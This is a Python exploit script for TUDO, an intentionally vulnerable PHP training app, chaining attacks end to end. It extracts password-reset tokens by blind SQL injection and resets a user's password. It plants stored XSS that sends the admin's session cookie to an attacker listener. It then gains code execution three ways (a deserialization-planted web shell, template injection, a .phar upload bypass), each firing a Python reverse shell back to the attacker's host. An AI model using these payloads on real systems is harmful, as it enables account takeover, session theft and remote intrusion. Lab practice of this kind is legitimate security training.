# TUDO (Vulnerable PHP Web-App).
# https://github.com/bmdyy/tudo
# Author: William Moody (@bmdyy)

# Python script author: d1Zzy666
# Date: 27/11/2024

from flask import Flask, request, send_from_directory
from multiprocessing import Process
import logging
import os
import re
import requests
import subprocess
import sys
import threading
import time
import urllib3
from termcolor import colored
import warnings

# Global variables - UPDATE as required
LHOST = "192.168.1.1"                         # Update as required
revport = 1337
flaskport = 8000
target = "tudo"
targetport = 80
sesscookie = "sak9vjettc69n277ck04d2jetn"       # Update initial cookie value
admincookie = ""
user = "user2"                                  # Update to desired target user
usrpasswd = "Password1"                         # Update to desired password on change
passwdtkn = ""
truetxt = "User exists!"
foundtokens = []
max_uid = 3                                     # Set this to a reasonable value
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Hide Traceback & Warning errors
sys.tracebacklimit = 0
warnings.filterwarnings("ignore")

# Requests session
session = requests.session()

# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Flask server (8000)
print(colored("Starting Flask Server (tcp 8000)...", "red"))
app = Flask(__name__)
threading.Thread(target=lambda: app.run(host=LHOST, port=flaskport, debug=False, use_reloader=False)).start()
print("\n")
logging.getLogger('werkzeug').disabled = True       # Hide errors in Flask

"""
Route to: 
+ handle XSS PHPSESSID response from admin
+ update admin cookie and login as admin
+ privesc menu options: Insecure Deserialization, SSTI, File upload bypass
"""
@app.route('/')
def onXSS():
    global admincookie
    admincookie = request.args.get("PHPSESSID")
    print("Admin cookie is: ", colored(f"{admincookie}", "blue"))

    # Update cookie to admin cookie
    session.cookies.set('PHPSESSID', admincookie)  
    
    # Log into the Admin page
    adminpagesource = session.get(f'http://{target}/index.php').text
    if re.search(r"\s*Hello, admin! Welcome to TUDO\s*", adminpagesource):
            print(colored("[+] Logged in as Admin.", "green"))
            print("\n")
    else:
        print(colored("[-] Error: not logged in as Admin!", "red"))
        print("\n")
    

    def privesc_one():
        # Privesc 1 - Insecure Deserialization (1)
        # <?php system($_GET['cmd']); ?>
        # php /tmp/serialize.php /var/www/html/cmd.php PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ 2>/dev/null
        php_code = """<?php

        class Log {
            public function __construct($f, $m) {
                $this->f = $f;
                $this->m = $m;
            }
            
            public function __destruct() {
                file_put_contents($this->f, $this->m, FILE_APPEND);
            }
        }

        // base64 so that it doesn't execute the code here
        $log = new Log($argv[1],base64_decode($argv[2]));
        print_r(serialize($log));	

        ?>
        """

        # Specify the file name
        file_name = "/tmp/serialize.php"            # Update as desired

        # Write the code to the file
        with open(file_name, "w") as file:
            file.write(php_code)

        print(colored(f"[+] PHP code successfully written to {file_name}", "green"))

        # Execute payload - create http://tudo/cmd.php command shell
        f = "/var/www/html/cmd.php"
        m = "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        proc = subprocess.Popen(f"php /tmp/serialize.php {f} {m} 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        payload = proc.stdout.read()
        stdout, stderr = proc.communicate()
        print("Output:", stdout.decode())
        print("Error:", stderr.decode())
        print(colored("[+] Generated payload!", "green"))
        data1 = {"userobj":payload}
        requests.post(f"http://{target}/admin/import_user.php", data=data1)

        # Execute reverse shell utilising http://tudo/cmd.php command shell
        print(colored(f"[-] Sending reverse shell to command shell.", "red"))
        revshellpayload = f"""cmd=python3%20-c%20'import%20os,pty,socket;s=socket.socket();s.connect((%22{LHOST}%22,{revport}));%5Bos.dup2(s.fileno(),f)for%20f%20in(0,1,2)%5D;pty.spawn(%22/bin/bash%22)'"""
        print(colored(f"[+] See Netcat response!", "green"))
        requests.get(f"http://{target}/cmd.php?{revshellpayload}")
    
    def privesc_two():
        # Privesc 2 - Server Side Template Injection (2)
        # In sstipayload {{}} to escape {php} and {/php}
        print(colored(f"[-] Sending SSTI payload.", "red"))
        url2 = f"http://{target}:{targetport}/admin/update_motd.php"
        cookies2 = {"PHPSESSID": f"{admincookie}"}
        headers2 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                "Content-Type": "application/x-www-form-urlencoded", 
                "Origin": f"http://{target}", 
                "Connection": "keep-alive", 
                "Referer": f"http://{target}/admin/update_motd.php", 
                "Upgrade-Insecure-Requests": "1"}
        sstipayload = f"""{{php}}echo `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{revport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`;{{/php}}"""
        data2 = {"message": f"{sstipayload}\r\n"}
        # POST payload
        session.post(url2, headers=headers2, cookies=cookies2, data=data2)
        # Trigger GET MotD
        url3 = "http://tudo:80/login.php"
        cookies3 = {"PHPSESSID": f"{admincookie}"}
        headers3 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                         "Accept-Language": "en-US,en;q=0.5", 
                         "Accept-Encoding": "gzip, deflate, br", 
                         "Referer": f"http://{target}/admin/update_motd.php", 
                         "Connection": "keep-alive", 
                         "Upgrade-Insecure-Requests": "1"}
        print(colored(f"[+] See Netcat response!", "green"))
        session.get(url3, headers=headers3, cookies=cookies3)           

    def privesc_three():
    # Privesc 3 - File Upload Bypass .phar (3)
        # Sending PHAR file
        print(colored(f"[-] Uploading cmdshell .PHAR file.", "red"))
        url4 = f"http://{target}:{targetport}/admin/upload_image.php"
        cookies4 = {"PHPSESSID": f"{admincookie}"}
        headers4 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                    "Accept-Language": "en-US,en;q=0.5", 
                    "Accept-Encoding": "gzip, deflate, br", 
                    "Content-Type": "multipart/form-data; boundary=---------------------------2056186306014066133051038448", 
                    "Origin": f"http://{target}", 
                    "Connection": "keep-alive", 
                    "Referer": f"http://{target}/admin/update_motd.php", 
                    "Upgrade-Insecure-Requests": "1"}
        cmdshellpayload = """<?php echo system($_GET['cmd']); ?>"""
        cmdshellfilename = "cmdshell.phar"
        data4 = f"-----------------------------2056186306014066133051038448\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\ncmdshell\r\n-----------------------------2056186306014066133051038448\r\nContent-Disposition: form-data; name=\"image\"; filename=\"{cmdshellfilename}\"\r\nContent-Type: image/gif\r\n\r\nGIF89a\r\n\r\n{cmdshellpayload}\n\r\n-----------------------------2056186306014066133051038448--\r\n"
        session.post(url4, headers=headers4, cookies=cookies4, data=data4)
        # Trigger cmdshell reverse shell
        revshellpayload2 = f"""python3%20-c%20'import%20os,pty,socket;s=socket.socket();s.connect((%22{LHOST}%22,{revport}));%5Bos.dup2(s.fileno(),f)for%20f%20in(0,1,2)%5D;pty.spawn(%22/bin/bash%22)'"""
        url5 = f"http://{target}:{targetport}/images/{cmdshellfilename}?cmd={revshellpayload2}"
        cookies5 = {"PHPSESSID": f"{admincookie}"}
        headers5 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                "Accept-Language": "en-US,en;q=0.5", 
                "Accept-Encoding": "gzip, deflate, br", 
                "Connection": "keep-alive", 
                "Upgrade-Insecure-Requests": "1"}
        print(colored(f"[+] See Netcat response!", "green"))
        session.get(url5, headers=headers5, cookies=cookies5)

    while True:
        print(colored("\nMenu:", "blue"))
        print(colored("1. Execute privesc 1 - Insecure Deserialization", "blue"))
        print(colored("2. Execute privesc 2 - SSTI in MotD", "blue"))
        print(colored("3. Execute privesc 3 - File Upload Bypass (.phar)", "blue"))
        print(colored("4. Exit", "blue"))

        choice = input(colored("Enter your choice: ", "red"))

        if choice == "1":
            privesc_one()
        elif choice == "2":
            privesc_two()
        elif choice == "3":
            privesc_three()
        elif choice == "4":
            print(colored("Exiting the program. Goodbye!", "red"))
            break
        else:
            print(colored("Invalid choice. Please try again.", "red"))

    return 'OK' # Used to remove Traceback warnings


# Netcat session (1337)
print(colored("Starting Netcat Shell (tcp 1337)...", "red"))
threading.Thread(target=os.system, args=(f'nc -lvnp {revport}',) ).start()
print("\n")

# Forgot password request for user
def passwdreq():
    url = f"http://{target}:{targetport}/forgotpassword.php"
    cookies = {"PHPSESSID": f"{sesscookie}"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
               "Accept-Language": "en-US,en;q=0.5", 
               "Accept-Encoding": "gzip, deflate, br", 
               "Content-Type": "application/x-www-form-urlencoded", 
               "Origin": f"http://{target}", 
               "Connection": "keep-alive", 
               "Referer": f"http://{target}/forgotpassword.php", 
               "Upgrade-Insecure-Requests": "1"}
    data = {"username": f"{user}"}
    session.post(url, headers=headers, cookies=cookies, data=data, verify=False)
    time.sleep(5)   # Short sleep post password request

# Enum password reset token
def enum_tokens():
    urllib3.disable_warnings()
    global passwdtkn
    uid = 1
    last_found_token = None  # Track the last discovered token
    print(colored("Enumerating tokens for all possible UIDs...", "red"))

    for uid in range(1, max_uid + 1):  # Loop through UIDs from 1 to max_uid
        token = ""
        position = 1
        print(colored(f"Trying UID {uid}...", "blue"))


        # Loop to find one full token character by character
        while True:
            found_char = False

            for char in charset:
                payload = f"""admin';select username from users where username='admin' AND substring((select token from tokens where uid={uid}),{position},1)='{char}'--"""
                url = f"http://{target}:{targetport}/forgotusername.php"
                cookies = {"PHPSESSID": sesscookie}
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": f"http://{target}/forgotusername.php"
                }
                data = {"username": payload}
                x = session.post(url, headers=headers, cookies=cookies, data=data)

                if truetxt in x.text:
                    token += char
                    position += 1
                    found_char = True
                    break

            # Break the inner loop if no character is found for the current token
            if not found_char:
                if token:
                    print(f"Token found for UID {uid}: {token}")
                    foundtokens.append((uid, token))
                else:
                    print(f"No token found for UID {uid}")
                break

    print(colored("Enumeration complete.", "green"))
    print(f"All discovered tokens: ", colored(f"{foundtokens}", "blue"))
    tokens_dict = dict(foundtokens)                 # Convert to a dictionary
    passwdtkn = tokens_dict.pop(3)                  # key 1 admin, key 2 user1, key 3 user2
    print(f"Password reset token for {user} is: ", colored(f"{passwdtkn}", "green"))

# Update user password and login
def userpasswd():
    global passwdtkn
    global usrpasswd
    # GET password reset session
    url1 = f"http://{target}:{targetport}/resetpassword.php?token={passwdtkn}"
    cookies1 = {"PHPSESSID": sesscookie}
    headers1 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
               "Accept-Language": "en-US,en;q=0.5", 
               "Accept-Encoding": "gzip, deflate, br", 
               "Connection": "keep-alive", 
               "Upgrade-Insecure-Requests": "1"}
    session.get(url1, headers=headers1, cookies=cookies1, verify=False)
    # Request reset
    url2 = f"http://{target}:{targetport}/resetpassword.php"
    cookies2 = {"PHPSESSID": sesscookie}
    headers2 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                "Accept-Language": "en-US,en;q=0.5", 
                "Accept-Encoding": "gzip, deflate, br", 
                "Content-Type": "application/x-www-form-urlencoded", 
                "Origin": f"http://{target}", 
                "Connection": "keep-alive", 
                "Referer": f"http://{target}/resetpassword.php?token={passwdtkn}", 
                "Upgrade-Insecure-Requests": "1"
                }
    data2 = {"token": f"{passwdtkn}", "password1": f"{usrpasswd}", "password2": f"{usrpasswd}"}
    session.post(url2, headers=headers2, cookies=cookies2, data=data2, verify=False)
    # Login as user2 - confirm success
    url3 = f"http://{target}:{targetport}/login.php"
    cookies3 = {"PHPSESSID": f"{sesscookie}"}
    headers3 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                "Accept-Language": "en-US,en;q=0.5", 
                "Accept-Encoding": "gzip, deflate, br", 
                "Content-Type": "application/x-www-form-urlencoded", 
                "Origin": f"http://{target}", 
                "Connection": "keep-alive", 
                "Referer": f"http://{target}/login.php", 
                "Upgrade-Insecure-Requests": "1"
                }
    data3 = {"username": f"{user}", "password": f"{usrpasswd}"}
    x = session.post(url3, headers=headers3, cookies=cookies3, data=data3, verify=False)
    if x.status_code == 200 and "Hello, user2! Welcome to TUDO -admin :)" in x.text:
        print(colored(f"[+] PASSWORD UPDATED! {user} logged in!", "green"))
    else:
        print(colored("[-] Uh oh! Not logged in!", "red"))

# Get admin session cookie - Stored XSS
def injXSS():
    url = f"http://{target}:{targetport}/profile.php"
    cookies = {"PHPSESSID": sesscookie}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
               "Accept-Language": "en-US,en;q=0.5", 
               "Accept-Encoding": "gzip, deflate, br", 
               "Content-Type": "application/x-www-form-urlencoded", 
               "Origin": f"http://{target}", 
               "Connection": "keep-alive", 
               "Referer": f"http://{target}/profile.php", 
               "Upgrade-Insecure-Requests": "1"}
    xsspayload = f"""<script>var i=new Image;i.src="http://{LHOST}:{flaskport}/?"+document.cookie;</script>"""
    data = {"description": f"{xsspayload}"}
    session.post(url, headers=headers, cookies=cookies, data=data, verify=False)
    print(colored(f"[+] XSS payload injected - wait for admin to browse site! See Flask response.", "green"))

# Order of functions
if __name__ == "__main__":
    passwdreq()
    enum_tokens()
    userpasswd()
    injXSS()
